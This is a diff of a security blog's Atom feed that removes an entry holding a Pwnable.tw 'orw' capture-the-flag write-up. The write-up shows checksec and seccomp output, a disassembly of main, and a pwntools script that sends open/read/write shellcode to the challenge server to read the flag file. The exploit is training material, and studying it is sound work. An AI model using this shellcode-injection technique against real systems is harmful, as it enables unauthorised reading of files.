     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
     
-    <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnable.tw orw Writeup</title>
-    <link href="https://kazma.tw/2024/02/07/Pwnable-tw-orw-Writeup/"/>
-    <id>https://kazma.tw/2024/02/07/Pwnable-tw-orw-Writeup/</id>
-    <published>2024-02-07T08:40:36.000Z</published>
-    <updated>2024-02-16T07:57:33.657Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Pwnable-tw-orw"><a href="#Pwnable-tw-orw" class="headerlink" title="Pwnable.tw - orw"></a>Pwnable.tw - orw</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Read the flag from &#x2F;home&#x2F;orw&#x2F;flag.<br>Only open read write syscall are allowed to use.</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#2" >https://pwnable.tw/challenge/#2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>一樣先觀察這題的一些基本資訊。</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file orw</span><br><span class="line">orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec orw</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/orw/orw&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><h3 id="orw"><a href="#orw" class="headerlink" title=".&#x2F;orw"></a>.&#x2F;orw</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./orw</span><br><span class="line">Give my your shellcode:1234</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure></div><h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  <span class="keyword">if</span> (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  <span class="keyword">if</span> (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  <span class="keyword">if</span> (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  <span class="keyword">if</span> (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  <span class="keyword">if</span> (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  <span class="keyword">if</span> (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  <span class="built_in">return</span> ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure></div><h3 id="disassemble-main"><a href="#disassemble-main" class="headerlink" title="disassemble main"></a>disassemble main</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048548 &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x0804854c &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x0804854f &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048552 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048553 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048555 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x08048556 &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x08048559 &lt;+17&gt;:    call   0x80484cb &lt;orw_seccomp&gt;</span><br><span class="line">   0x0804855e &lt;+22&gt;:    sub    esp,0xc</span><br><span class="line">   0x08048561 &lt;+25&gt;:    push   0x80486a0</span><br><span class="line">   0x08048566 &lt;+30&gt;:    call   0x8048380 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x0804856b &lt;+35&gt;:    add    esp,0x10</span><br><span class="line">   0x0804856e &lt;+38&gt;:    sub    esp,0x4</span><br><span class="line">   0x08048571 &lt;+41&gt;:    push   0xc8</span><br><span class="line">   0x08048576 &lt;+46&gt;:    push   0x804a060</span><br><span class="line">   0x0804857b &lt;+51&gt;:    push   0x0</span><br><span class="line">   0x0804857d &lt;+53&gt;:    call   0x8048370 &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">   0x08048582 &lt;+58&gt;:    add    esp,0x10</span><br><span class="line">   0x08048585 &lt;+61&gt;:    mov    eax,0x804a060</span><br><span class="line">   0x0804858a &lt;+66&gt;:    call   eax</span><br><span class="line">   0x0804858c &lt;+68&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048591 &lt;+73&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048594 &lt;+76&gt;:    leave</span><br><span class="line">   0x08048595 &lt;+77&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048598 &lt;+80&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><h3 id="0x2-Exploitation"><a href="#0x2-Exploitation" class="headerlink" title="0x2 Exploitation"></a>0x2 Exploitation</h3><p>題目描述說只能使用 open read write，從 seccomp-tools 也能確認這個限制，逆向分析會發現就是很單純的把我們給的 shellcode 拿去執行而已，好像也沒什麼好解釋的，那就直接上 exploit XD。</p><h3 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./orw&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(</span><br><span class="line">    shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">b&#x27;/home/orw/flag&#x27;</span>) +</span><br><span class="line">    shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>) +</span><br><span class="line">    shellcraft.i386.linux.write(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>, sc)</span><br><span class="line">flag = r.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">success(<span class="string">&#x27;Flag: %s&#x27;</span> % flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[+] Flag: b<span class="string">&#x27;FLAG&#123;?????????????????????????&#125;&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure></div><h2 id="0x5-References"><a href="#0x5-References" class="headerlink" title="0x5 References"></a>0x5 References</h2><p>可以參考張元在 edu-ctf 上的 how2orw，下面附上影片連結和 writeup：<br><a class="link"   href="https://www.youtube.com/watch?v=U8N6aE-Nq-Q" >https://www.youtube.com/watch?v=U8N6aE-Nq-Q <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a href="https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/">https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/</a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-orw&quot;&gt;&lt;a href=&quot;#Pwnable-tw-orw&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - orw&quot;&gt;&lt;/a&gt;Pwnable.tw - orw&lt;/h1&gt;&lt;h3 id=&quot;Description&quot;&gt;</summary>
-      
-    
-    
-    
-    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
-    
-    <category term="orw" scheme="https://kazma.tw/tags/orw/"/>
+    <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
     
   </entry>
   
